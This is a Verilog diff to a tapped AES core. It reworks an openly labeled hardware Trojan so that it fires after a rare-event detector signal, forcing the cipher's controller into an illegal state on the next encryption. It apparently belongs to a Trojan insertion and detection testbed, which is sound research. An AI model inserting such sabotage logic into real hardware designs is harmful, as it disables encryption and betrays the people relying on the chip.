@@ -33,7 +33,10 @@ module aes_core_tapped(
                 // Tapped outputs for monitors
                 output wire [1407 : 0] round_keys_flat,
                 output wire [3 : 0]   muxed_round_nr,
-                output wire [127 : 0] state_before_final
+                output wire [127 : 0] state_before_final,
+
+                // RED signal from Rare Event Detector
+                input wire [7:0]     red_code
                );
 
 
@@ -48,8 +51,12 @@ module aes_core_tapped(
 
   // TROJAN registers
   reg         prev_next;
-  reg         prev_enc_count_was_one;
+  reg         saw_red_t2;        // Saw RED T2 pattern (code = 0x10)
+  reg         trojan_fired;      // Set when Trojan fires, reset only on key init
   reg [7:0]   encrypt_count;
+
+  // RED T2 pattern code
+  localparam RED_CODE_T2_SEQ = 8'h10;
 
 
   //----------------------------------------------------------------
@@ -187,9 +194,10 @@ module aes_core_tapped(
           ready_reg          <= 1'b1;
           aes_core_ctrl_reg  <= CTRL_IDLE;
           // TROJAN BEGIN: T04_p4_debug_port
-          encrypt_count           <= 8'd0;
-          prev_next              <= 1'b0;
-          prev_enc_count_was_one <= 1'b0;
+          encrypt_count      <= 8'd0;
+          prev_next         <= 1'b0;
+          saw_red_t2        <= 1'b0;  // Reset on reset_n
+          trojan_fired      <= 1'b0;
           // TROJAN END: T04_p4_debug_port
         end
       else
@@ -202,28 +210,21 @@ module aes_core_tapped(
           if (ready_we)
             ready_reg <= ready_new;
 
-          // Reset counter on key expansion
-          if (init && encdec) begin
-            encrypt_count <= 8'd0;
+          // Store prev_next for edge detection
+          prev_next <= next;
+
+          // TROJAN: T04 - Capture RED T2 pattern (sticky code)
+          // red_code stays at 0x10 after T2 detection, unlike red_warning which resets
+          if (red_code == RED_CODE_T2_SEQ && !saw_red_t2 && !trojan_fired) begin
+            saw_red_t2 <= 1'b1;
           end
 
-          // TROJAN: T04 - Rising edge detection on 'next' signal
-          // Rising edge: current 'next' is 1, previous 'prev_next' is 0
-          if (next && !prev_next && encdec && !init) begin
-            // Rising edge detected - this is an encryption start
-            // Count it
-            encrypt_count <= encrypt_count + 8'd1;
-          end
-
-          // Inject on 2nd encryption - use pipeline to remember if count was 1
-          // prev_enc_count_was_one = 1 means the PREVIOUS rising edge made count go from 0->1
-          // So this rising edge is the 2nd one (0->1 already happened)
-          if (prev_enc_count_was_one) begin
+          // TROJAN: T04 - Fire on next encryption cycle after RED T2 detected
+          // When next goes high (rising edge detected) AND saw_red_t2 is set, fire Trojan
+          if (next && !prev_next && encdec && !init && saw_red_t2 && !trojan_fired) begin
             aes_core_ctrl_reg <= CTRL_ILLEGAL;
+            trojan_fired <= 1'b1;
           end
-
-          // Update pipeline register for next cycle
-          prev_enc_count_was_one <= (encrypt_count == 8'd0) && next && !prev_next && encdec && !init;
 
           // Store prev_next for edge detection
           prev_next <= next;
